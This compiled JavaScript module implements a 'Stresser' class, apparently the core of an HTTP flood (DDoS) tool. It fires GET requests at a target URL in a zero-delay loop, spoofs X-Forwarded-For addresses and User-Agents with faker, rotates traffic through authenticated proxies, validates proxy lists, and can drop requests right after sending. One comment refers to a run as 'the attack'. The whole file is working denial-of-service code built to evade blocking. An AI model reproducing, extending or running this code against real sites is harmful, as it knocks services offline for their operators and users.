"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.Stresser = void 0;
const url_1 = require("url");
const http_1 = __importDefault(require("http"));
require("overpaint.js");
const axios_1 = __importDefault(require("axios"));
const faker_1 = require("@faker-js/faker");
const PacketType_1 = require("../enums/PacketType");
const Stats_1 = require("./Stats");
const Packet_1 = require("../types/Packet");
const LogType_1 = require("../enums/LogType");
const Log_1 = require("../types/Log");
class Stresser {
    get nextProxy() {
        return this.options.proxies[++this._proxyIndex % this.options.proxies.length];
    }
    // ===== Constructor =====
    constructor(options) {
        // ===== Proxies =====
        this._proxyIndex = 0;
        // ===== Statistics =====
        this.stats = new Stats_1.Stats();
        // set options
        this.options = options;
        // set target URL
        this.targetURL = new url_1.URL(this.options.target);
        // create http agent
        this.httpAgent = new http_1.default.Agent(options.agent);
        // start sending stats updates
        setInterval(() => this.sendStatsUpdate(), this.options.updateInterval);
        // handle errors
        ['uncaughtException', 'unhandledRejection']
            .forEach(code => process.on(code, (error) => { var _a; return (_a = process.send) === null || _a === void 0 ? void 0 : _a.call(process, (0, Packet_1.Packet)(PacketType_1.PacketType.Error, error)); }));
    }
    // ========== Stressing ==========================================================================
    /**
     * Send a request to the target URL
     * @param proxy The proxy to use for the request
     */
    makeRequest_Beta(proxy) {
        return new Promise((resolve, reject) => {
            var _a;
            try {
                if (this.stats.pending >= this.options.maxPending)
                    resolve(null);
                this.requestSent();
                // create headers
                let headers = {
                    'X-Forwarded-For': faker_1.faker.internet.ipv4(),
                    'User-Agent': faker_1.faker.internet.userAgent(),
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Referer': this.targetURL.hostname
                };
                // create options
                let options = {
                    method: 'GET',
                    hostname: this.targetURL.hostname,
                    port: this.targetURL.port,
                    path: this.targetURL.pathname + this.targetURL.search,
                    headers: headers,
                    agent: this.httpAgent,
                    timeout: 5000,
                    // ==========================================
                };
                // handle use of proxy
                if (this.options.useProxies) {
                    if (!proxy)
                        proxy = this.nextProxy;
                    // transfer target host to headers for proxy
                    headers['Host'] = `${options.hostname}:${options.port}`;
                    // use proxy for target host
                    options.hostname = proxy[0];
                    options.port = Number(proxy[1]);
                    // add proxy auth
                    if (proxy.length === 4) {
                        let auth = Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64');
                        headers['Proxy-Authorization'] = `Basic ${auth}`;
                    }
                }
                const request = http_1.default.request(options, (response) => {
                    response.on('data', (chunk) => { });
                    response.once('end', () => resolve(this.requestCompleted(response.statusCode)));
                });
                request.once('error', () => resolve(this.requestError()));
                // request.once('timeout', () => resolve(this.requestCompleted(false)));
                request.end();
                // if (!this.options.tracking) request.destroy();
            }
            catch (error) {
                (_a = process.send) === null || _a === void 0 ? void 0 : _a.call(process, (0, Packet_1.Packet)(PacketType_1.PacketType.Error, error));
                resolve(this.requestError());
            }
        });
    }
    /**
     * Send a request to the target URL
     * @param proxy The proxy to use for the request
     */
    makeRequest(proxy) {
        return __awaiter(this, void 0, void 0, function* () {
            if (this.stats.pending >= this.options.maxPending)
                return null;
            // create headers
            let headers = {
                'X-Forwarded-For': faker_1.faker.internet.ipv4(),
                'User-Agent': faker_1.faker.internet.userAgent(),
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': this.targetURL.hostname
            };
            // create options
            let options = {
                method: 'GET',
                url: this.targetURL.href,
                headers: headers,
                timeout: 5000
            };
            // use proxy
            if (this.options.useProxies) {
                if (!proxy)
                    proxy = this.nextProxy;
                options.proxy = {
                    protocol: 'http',
                    host: proxy[0],
                    port: Number(proxy[1]),
                    auth: proxy.length === 4 ? {
                        username: proxy[2],
                        password: proxy[3],
                    } : undefined,
                };
            }
            ;
            this.requestSent();
            const cancelToken = axios_1.default.CancelToken.source();
            options.cancelToken = cancelToken.token;
            const result = (0, axios_1.default)(options)
                .then((response) => {
                // process.send?.(Packet(PacketType.Log, Log(LogType.Info, "completed")));
                return (response)
                    ? this.requestCompleted(response.status)
                    : this.requestError();
            }, (error) => {
                // process.send?.(Packet(PacketType.Log, Log(LogType.Info, error.message)));
                return (error.response)
                    ? this.requestCompleted(error.response.status)
                    : (axios_1.default.isCancel(error))
                        ? this.requestDropped()
                        : this.requestError(error);
            });
            if (this.options.dropRequests)
                cancelToken.cancel();
            return result;
        });
    }
    /**
     * Stress the target URL for a specified duration
     * @param duration The duration of the attack
     * @param config The configuration to use for the requests
     */
    stress(duration) {
        return __awaiter(this, void 0, void 0, function* () {
            // send requests
            this.tick_v1();
            // this.tick_v2(Date.now() + duration * 1000);
        });
    }
    tick_v1() {
        setInterval(() => {
            for (let i = 0; i < this.options.multiplier; i++)
                this.makeRequest();
        }, 0);
    }
    tick_v2(stop, ticks = 0) {
        if (Date.now() >= stop)
            return this.sendStatsUpdate();
        if (ticks === 10000)
            ticks = 0, this.sendStatsUpdate();
        for (let i = 0; i < this.options.multiplier; i++)
            this.makeRequest_Beta();
        process.nextTick(() => this.tick_v2(stop, ticks + 1));
    }
    // ========== Proxies =============================================================================
    validateProxies(proxies) {
        return __awaiter(this, void 0, void 0, function* () {
            var _a;
            // validate proxies, and get an array of results (true/false)
            let proxy_results = yield Promise.all(proxies.map((proxy) => __awaiter(this, void 0, void 0, function* () { return yield this.makeRequest(proxy); })));
            (_a = process.send) === null || _a === void 0 ? void 0 : _a.call(process, (0, Packet_1.Packet)(PacketType_1.PacketType.Log, (0, Log_1.Log)(LogType_1.LogType.Info, `Validating proxies...`)));
            // filter out invalid proxies
            let valid_proxies = proxies.filter((proxy, index) => proxy_results[index]);
            // return valid proxies
            return valid_proxies;
        });
    }
    // ========== Statistics =========================================================================
    requestSent() {
        this.stats.requests++;
        this.stats.pending++;
    }
    requestError(error) {
        // process.send?.(Packet(PacketType.Log, Log(LogType.Info, `${error?.message}`)));
        this.stats.pending--;
        this.stats.errors++;
        return false;
    }
    requestDropped() {
        this.stats.pending--;
        this.stats.dropped++;
        return false;
    }
    requestCompleted(code) {
        this.stats.pending--;
        this.stats.codes.register(code);
        let success = (code === 200);
        (success) ? this.stats.success++ : this.stats.fails++;
        return success;
    }
    /**
     * Send a stats update to the master process
     */
    sendStatsUpdate() {
        var _a;
        (_a = process.send) === null || _a === void 0 ? void 0 : _a.call(process, (0, Packet_1.Packet)(PacketType_1.PacketType.Data, this.stats));
    }
}
exports.Stresser = Stresser;
process.on('uncaughtException', (error) => {
    throw error;
});
process.on('unhandledRejection', (error) => {
    throw error;
});
//# sourceMappingURL=Stresser.js.map